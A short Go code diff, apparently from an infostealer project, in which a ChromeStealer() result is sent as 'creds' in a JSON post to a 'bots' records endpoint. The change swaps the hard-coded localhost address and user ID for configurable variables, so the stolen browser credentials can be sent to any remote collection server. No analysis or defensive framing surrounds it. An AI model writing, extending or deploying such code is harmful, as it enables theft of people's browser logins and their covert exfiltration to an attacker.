@@ -9,6 +9,9 @@ import (
 	"net/http"
 )
 
+var ConfigUrl string
+var ConfigUserId string
+
 func main() {
 	jsonString := ChromeStealer()
 
@@ -18,11 +21,11 @@ func main() {
 		"country_code": "in",
 		"ip":           "1.2.3.5",
 		"creds":        jsonString,
-		"user":         "6sba2ueggucg514",
+		"user":         ConfigUserId,
 	})
 	responseBody := bytes.NewBuffer(postBody)
 
-	resp, err := http.Post("http://localhost:8090/api/collections/bots/records", "application/json", responseBody)
+	resp, err := http.Post(ConfigUrl+"/api/collections/bots/records", "application/json", responseBody)
 	if err != nil {
 		log.Fatalln(err)
 	}
